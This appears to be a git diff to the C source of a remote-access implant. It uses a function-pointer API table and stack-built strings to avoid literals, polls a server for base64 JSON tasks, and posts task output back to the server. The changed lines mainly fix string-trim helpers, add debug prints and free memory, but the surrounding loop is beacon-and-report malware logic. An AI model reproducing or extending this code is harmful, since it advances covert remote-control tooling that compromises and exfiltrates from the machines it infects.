@@ -204,10 +204,11 @@ Input:
 
     [in] CHAR trim: character to trim
 
-
 Output:
     A CHAR* that needs to be freed
 
+Note:
+    If `str` only consists of `trim` characters, an empty string that still `needs to be freed` is returned
 */
 CHAR* myStartTrim(PAPI api, CCHAR* str, CHAR trim)
 {
@@ -222,6 +223,17 @@ CHAR* myStartTrim(PAPI api, CCHAR* str, CHAR trim)
 
     // size of the trimmed string with the null byte
     DWORD dwSizeTrimmedString = myStrlenA(trimmedStr)+1;
+
+    #ifdef DEBUG
+    CHAR head[] = { 'm', 'S', 'T', '\n', 0 };
+    ((PRINTF)api->printf)(head);
+
+    CHAR trimmedString_c[] = { 't', 's', ':', ' ', '%', 's', '\n', 0 };
+    ((PRINTF)api->printf)(trimmedString_c, trimmedStr);
+
+    CHAR sizeTrimmedString_c[] = { 's', 't', 's', ':', ' ', '%', 'd', '\n', 0 };
+    ((PRINTF)api->printf)(sizeTrimmedString_c, dwSizeTrimmedString);
+    #endif
 
     // create a buffer with the size of the trimmed string
     CHAR* outStr = ((CALLOC)api->calloc)(dwSizeTrimmedString, sizeof(CHAR));
@@ -245,27 +257,44 @@ Input:
 Output:
     Success -> a CHAR* that needs to be freed
 
-    `str` is empty -> NULL
+    Failure -> `str` is empty -> null terminated empty string
 
-    memory allocation failed -> NULL
+    Failure -> memory allocation failed -> NULL
 
 Note:
-    TODO: add checks for `str` having only the `trim` character
+    If `str` only consists of trim characters a pointer to an empty string that still needs to be freed is returned
 */
 CHAR* myEndTrim(PAPI api, CCHAR* str, CHAR trim)
 {
     if (myStrlenA(str) == 0)
     {
-        return NULL;
+        #ifdef DEBUG
+        CHAR note_c[] = { 'm', 'y', 'E', 'n', 'd', 'T', 'r', 'i', 'm', ':', ' ', '%', 's', '\n', 0 };
+        ((PRINTF)api->printf)(note_c, str);
+        #endif
+        CHAR* emptyStr = ((CALLOC)api->calloc)(1, sizeof(CHAR));
+        emptyStr[0] = '\0';
+
+        return emptyStr;
     }
 
-    // the index of the last character that is not `trim`
+    // variable to hold the index of the last character that is not `trim`
+    // holds the last index of the string excluding the null byte on initialization
     DWORD dwLastIndex = myStrlenA(str)-1;
 
     // get the last index that doesn't hold a trim character
     while (dwLastIndex >= 0 && str[dwLastIndex] == trim)
     {
         dwLastIndex--;
+    }
+
+    // if `str` only consists of `trim` characters, return empty string on heap
+    if (dwLastIndex == -1)
+    {
+        CHAR* emptyStr = ((CALLOC)api->calloc)(1, sizeof(CHAR));
+        emptyStr[0] = '\0';
+
+        return emptyStr;
     }
 
     // last index + 1 gives the size of the string without the null byte
@@ -276,6 +305,10 @@ CHAR* myEndTrim(PAPI api, CCHAR* str, CHAR trim)
 
     if (trimmedStr == NULL)
     {
+        #ifdef DEBUG
+        CHAR fail[] = { 'e', 'n', 'd', 't', 'r', 'i', 'm', 'C', 'a', 'l', 'l', 'o', 'c', 'F', '\n', 0 };
+        ((PRINTF)api->printf)(fail);
+        #endif
         return NULL;
     }
 
@@ -286,6 +319,10 @@ CHAR* myEndTrim(PAPI api, CCHAR* str, CHAR trim)
     }
 
     trimmedStr[dwLastIndex + 1] = '\0';
+    #ifdef DEBUG
+    CHAR trimmedStr_c[] = { 'e', 'n', 'd', 't', 'r', 'i', 'm', ':', ' ', '%', 's', '\n', 0 };
+    ((PRINTF)api->printf)(trimmedStr_c, trimmedStr);
+    #endif
     return trimmedStr;
 }
 
@@ -300,7 +337,10 @@ Input:
     [in] CHAR trim: the character to remove
 
 Output:
-    heapCHAR*: the trimmed string that needs to be freed
+    heap CHAR*: the trimmed string that needs to be freed
+
+Note:
+    if `str` only consists of the `trim` character, an empty string that still `needs to be freed` is returned is returned
 */
 CHAR* myTrim(PAPI api, CCHAR* str, CHAR trim)
 {
@@ -333,11 +373,13 @@ Input:
     [out] [heap] CHAR** uuid: a pointer to receive the uuid member in json that needs to be freed
 
 Output:
-    Success -> CHAR*: a pointer to a base64 encoded string that holds the task value
+    Success -> CHAR*: a pointer to a base64 encoded string that holds the task value that `needs to be freed`
 
     Json doesn't hold any data -> NULL
 
 Note:
+    If the `task` member of json is empty (a.k.a. what to run is determined only by `taskType`) the return value is empty string that still `needs to be freed`
+
     // TODO: This function can be improved by using a struct to hold the json
 
 */
@@ -375,6 +417,10 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     }
 
     #ifdef DEBUG
+    ((PRINTF)api->printf)(tmpJson);
+    #endif
+
+    #ifdef DEBUG
     char hi[] = { 'N', 'u', 'm', 'b', 'e', 'r', 'O', 'f', 'T', 'o', 'k', 'e', 'n', 's', ':', ' ', '%', 'd', '\n', 0 };
     ((PRINTF)api->printf)(hi, tokensStruct.numberOfTokens);
     #endif
@@ -401,12 +447,28 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     // remove the double quotes
     task = myTrim(api, trimmedToken2, '"');
 
+    #ifdef DEBUG
+    if (task == NULL)
+    {
+        char fail_c[] = { 'T', 'a', 's', 'k', 'N', 'U', 'L', 'L', '\n', 0 };
+        ((PRINTF)api->printf)(fail_c);
+    }
+    char task_c[] = { 'T', 'a', 's', 'k', ':' , ' ', '%', 's', '\n', 0 };
+    ((PRINTF)api->printf)(task_c, task);
+    char note_c[] = { 'N', 'o', 't', 'e', ':', ' ', '%', 's', '\n', 0 };
+    char note_cr[] = { 'h', 'i', 0 };
+    ((PRINTF)api->printf)(note_c, note_cr);
+    #endif
+
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
     ((FREE)api->free)(trimmedToken2);
     trimmedToken2 = NULL;
 
     token = getToken(api, tokensStruct, 4);
+    #ifdef DEBUG
+    ((PRINTF)api->printf)(token);
+    #endif
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
@@ -621,6 +683,7 @@ void myMain()
 
         b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
 
+        // json is empty
         if (b64Task == NULL)
         {
             ((SLEEP)api->Sleep)(3000);
@@ -712,6 +775,11 @@ void myMain()
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
         PostRequest(api, wServer, port, fullPath2, json);
 
+        if (b64Task)
+        {
+            ((FREE)api->free)(b64Task);
+            b64Task = NULL;
+        }
         if (taskId)
         {
             ((FREE)api->free)(taskId);
